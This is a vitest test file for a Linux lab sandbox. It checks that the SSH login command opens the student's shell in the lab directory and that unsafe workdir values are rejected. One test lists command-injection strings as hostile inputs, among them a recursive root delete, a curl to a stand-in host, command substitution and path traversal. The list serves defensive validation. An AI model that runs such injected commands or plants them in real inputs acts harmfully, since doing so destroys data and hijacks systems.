/**
 * Where an Ansible student's shell lands.
 *
 * The sandbox image cds into the lab directory from the shell's rc files; these
 * tests pin the other half, the landing point named by the credential the API
 * issued, so the terminal still opens in the project if that rc file ever
 * changes. Verified against the real image: with the shipped `.profile` both
 * routes land in `/home/student/lab`.
 */
import { describe, expect, it } from 'vitest';
import { isSafeWorkdir, remoteLoginCommand } from '../src/workspace.js';

const WORKSPACE = '/home/student/lab';

describe('the shell landing directory', () => {
  it('opens the shell in the lab project the credential names', () => {
    const command = remoteLoginCommand(WORKSPACE);

    // One argv element: ssh joins what follows the destination into a single
    // command string, so splitting it here would change what runs.
    expect(command).toHaveLength(1);
    expect(command[0]).toContain(`cd ${WORKSPACE} `);
  });

  it('still runs a login shell, so the student keeps their profile', () => {
    expect(remoteLoginCommand(WORKSPACE)[0]).toMatch(/exec .*-l$/);
  });

  it('execs the shell rather than leaving one wrapping it', () => {
    // Without `exec` the student's shell would be a child of the cd wrapper,
    // and exiting it would leave the session half-closed.
    expect(remoteLoginCommand(WORKSPACE)[0]).toContain('exec ');
  });

  it('falls back to a plain login shell when no workdir is offered', () => {
    // The Kubernetes track issues no ssh workdir at all. Its credentials must
    // still open a shell, so an absent workdir means "no remote command".
    expect(remoteLoginCommand(undefined)).toEqual([]);
    expect(remoteLoginCommand('')).toEqual([]);
  });

  /**
   * The workdir is the one part of the ssh argv that becomes remote shell
   * syntax. It is platform-authored today, so this is a backstop rather than
   * the primary control — but a backstop that is asserted is a backstop that
   * still exists after the next refactor.
   */
  it('refuses a workdir carrying shell syntax, rather than passing it through', () => {
    const hostile = [
      '/home/student/lab; rm -rf /',
      '/home/student/lab && curl evil.example',
      '/home/student/lab$(id)',
      '/home/student/lab`id`',
      '/home/student/lab|id',
      "/home/student/lab'",
      '/home/student/lab\nid',
      '/home/student/../../etc',
    ];

    for (const workdir of hostile) {
      expect(isSafeWorkdir(workdir), `${workdir} must not be accepted`).toBe(false);
      expect(remoteLoginCommand(workdir), `${workdir} must produce no command`).toEqual([]);
    }
  });

  it('requires an absolute path', () => {
    expect(isSafeWorkdir('lab')).toBe(false);
    expect(isSafeWorkdir('home/student/lab')).toBe(false);
    expect(isSafeWorkdir(WORKSPACE)).toBe(true);
  });
});
